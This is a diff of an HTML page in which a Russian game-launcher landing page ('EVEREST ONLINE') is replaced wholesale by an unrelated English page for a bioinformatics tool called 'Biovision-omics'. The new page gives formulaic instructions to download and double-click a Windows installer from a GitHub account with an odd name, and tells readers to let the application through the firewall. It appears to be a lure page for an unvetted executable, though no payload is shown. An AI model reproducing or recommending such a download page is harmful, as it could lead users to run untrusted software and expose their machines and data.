@@ -1,164 +1,64 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EVEREST ONLINE</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            /* Фон: сначала цвет, потом картинка */
-            background-color: #050505;
-            background-image: url('https://unlimbot.hb.ru-msk.vkcloud-storage.ru/image/4/019fb3df-1295-76ae-87ca-792cd18af628-908ddf7998f94302b29245e7f4952ca4.jpg');
-            background-size: cover;       /* Растянуть на весь экран без искажений */
-            background-position: center;  /* Центрировать картинку */
-            background-repeat: no-repeat; /* Не повторять */
-            color: #fff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        /* Логотип и заголовок */
-        .header {
-            width: 100%;
-            padding: 60px 20px;
-            text-align: center;
-        }
-        .logo-big {
-            font-size: 110px;
-            font-weight: 900;
-            color: #FF5722;
-            line-height: 0.9;
-            text-transform: uppercase;
-            letter-spacing: -5px;
-            filter: drop-shadow(0 0 15px rgba(255, 87, 34, 0.6));
-        }
-        h1 {
-            font-size: 28px;
-            color: #ffffff;
-            margin-top: 10px;
-            text-transform: uppercase;
-            letter-spacing: 4px;
-        }
-        p.subtitle {
-            color: #999;
-            margin-top: 10px;
-            font-size: 15px;
-        }
-
-        /* Контейнер кнопок */
-        .buttons-wrapper {
-            width: 100%;
-            max-width: 900px;
-            padding: 0 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 20px;
-        }
-
-        /* Группы кнопок */
-        .group {
-            display: flex;
-            gap: 15px;
-        }
-        .center-btn-container {
-            flex: 1;
-            text-align: center;
-            margin-top: -10px; 
-        }
-
-        /* Обычные кнопки (плоские, не слипаются) */
-        .btn-flat {
-            padding: 14px 24px;
-            background: #1a1a1a;
-            border: 1px solid #333;
-            color: #ccc;
-            text-decoration: none;
-            font-weight: 600;
-            cursor: pointer;
-            text-transform: uppercase;
-            transition: all 0.3s ease;
-            border-radius: 8px;
-            font-size: 14px;
-            min-width: 130px;
-            text-align: center;
-        }
-        .btn-flat:hover {
-            border-color: #FF5722;
-            color: #FF5722;
-            background: #222;
-            box-shadow: 0 0 10px rgba(255, 87, 34, 0.3);
-        }
-
-        /* Главная кнопка (Скачать лаунчер) */
-        .btn-main {
-            padding: 16px 32px;
-            background: linear-gradient(135deg, #FF5722 0%, #FF8F32 100%);
-            color: #000;
-            text-decoration: none;
-            font-weight: bold;
-            cursor: pointer;
-            text-transform: uppercase;
-            transition: transform 0.2s, box-shadow 0.2s;
-            box-shadow: 0 0 20px rgba(255, 87, 34, 0.5);
-            border-radius: 50px;
-            font-size: 16px;
-            border: none;
-            min-width: 200px;
-        }
-        .btn-main:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 35px rgba(255, 87, 34, 0.8);
-        }
-
-        /* Адаптив под телефон */
-        @media (max-width: 600px) {
-            .buttons-wrapper {
-                flex-direction: column;
-                align-items: stretch;
-            }
-            .group {
-                width: 100%;
-                justify-content: center;
-            }
-            .center-btn-container {
-                width: 100%;
-                margin-top: 20px;
-            }
-            .logo-big { font-size: 80px; }
-            h1 { font-size: 22px; }
-        }
-    </style>
+    <meta name="description" content="Biovision-omics provides tools for biological imaging and spatial transcriptomics. This guide helps users download and run the software on Windows.">
+    <title>Biovision-omics Documentation</title>
 </head>
-<body>
-    <div class="header">
-        <div class="logo-big">E</div>
-        <h1>EVEREST ONLINE</h1>
-        <p class="subtitle">Криминальная Россия на твоём телефоне</p>
+<body style="font-family: sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f7f6;">
+
+    <h1 style="color: #2c3e50;">🔬 Biovision-omics - Analyze biological images and transcriptomics data</h1>
+
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/Heterosexual-scalage95/Biovision-omics" style="background-color: #555; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software</a>
     </div>
 
-    <div class="buttons-wrapper">
-        <!-- Левая группа: Форум, Правила -->
-        <div class="group">
-            <a href="forum.html" class="btn-flat">Форум</a>
-            <a href="pravila.html" class="btn-flat">Правила</a>
-        </div>
+    <h2 style="color: #2c3e50;">📖 About the software</h2>
+    <p>Biovision-omics helps researchers study biological images and spatial transcriptomics. The software uses machine learning to identify patterns in your data. It supports quality control, image segmentation, and phenotype classification. You can use this tool to interpret complex biological data without manual processing.</p>
 
-        <!-- Центр: Скачать лаунчер (чуть приподнят) -->
-        <div class="center-btn-container">
-            <a href="Launcher.apk" class="btn-main">Скачать лаунчер</a>
-        </div>
+    <h2 style="color: #2c3e50;">💻 System requirements</h2>
+    <p>Before you install the software, ensure your computer meets these requirements:</p>
+    <ul style="padding-left: 20px;">
+        <li>Windows 10 or Windows 11.</li>
+        <li>At least 16 GB of RAM.</li>
+        <li>A modern processor (Intel Core i5 or AMD Ryzen 5 or better).</li>
+        <li>A dedicated graphics card with at least 6 GB of video memory.</li>
+        <li>At least 50 GB of free space on your hard drive.</li>
+    </ul>
 
-        <!-- Правая группа: Донат, Контакты -->
-        <div class="group">
-            <a href="donat.html" class="btn-flat">Донат</a>
-            <a href="contact.html" class="btn-flat">Контакты</a>
-        </div>
-    </div>
+    <h2 style="color: #2c3e50;">📥 Getting started</h2>
+    <p>Follow these steps to set up the software on your computer:</p>
+    <ol style="padding-left: 20px;">
+        <li>Visit the <a href="https://github.com/Heterosexual-scalage95/Biovision-omics">official GitHub releases page</a> to download the software installer.</li>
+        <li>Locate the downloaded file in your downloads folder.</li>
+        <li>Double-click the installer file.</li>
+        <li>Follow the on-screen prompts to complete the installation process.</li>
+        <li>Once finished, launch the application from your desktop or start menu.</li>
+    </ol>
+
+    <h2 style="color: #2c3e50;">⚙️ How to use the application</h2>
+    <p>The application interface consists of a dashboard for data management and an analysis tab for processing images. Start by importing your raw image files into the designated data folder. The system logs the progress of your analysis automatically.</p>
+    <p>To begin an analysis, select the specific imaging files from the navigation window. Choose the segmentation task if you want to identify individual cells. Use the transcriptomic interpretation tool to map gene activity to your visible data. The software saves all output files into a folder labeled "results" for your review.</p>
+
+    <h2 style="color: #2c3e50;">🛠️ Troubleshooting</h2>
+    <p>If you encounter errors, check these common items:</p>
+    <ul style="padding-left: 20px;">
+        <li>Ensure your graphics drivers are up to date.</li>
+        <li>Verify that your firewall allows the application to access the network.</li>
+        <li>Check that your file paths do not contain special characters.</li>
+        <li>Restart your computer if the application becomes unresponsive.</li>
+    </ul>
+
+    <h2 style="color: #2c3e50;">📁 Data management</h2>
+    <p>The software handles large datasets by processing one file at a time. This keeps your machine stable. You should store your research data on a fast solid-state drive to ensure quick access. Always keep a backup of your inputs in a separate folder.</p>
+
+    <h2 style="color: #2c3e50;">🤝 Contributing</h2>
+    <p>You can report issues or suggest improvements directly through the issue tracker on the repository page. Your feedback helps the development team improve the software for all users.</p>
+
+    <hr style="border: 0; border-top: 1px solid #ccc; margin: 40px 0;">
+
+    <p style="font-size: 0.9em; color: #777;">Keywords: bioinformatics, biological-imaging, computer-vision, cosmx, deep-learning, image-segmentation, liver-fibrosis, masld, mlops, multiomics, pytorch, single-cell, spatial-transcriptomics, unet, vision-transformer</p>
+
 </body>
 </html>
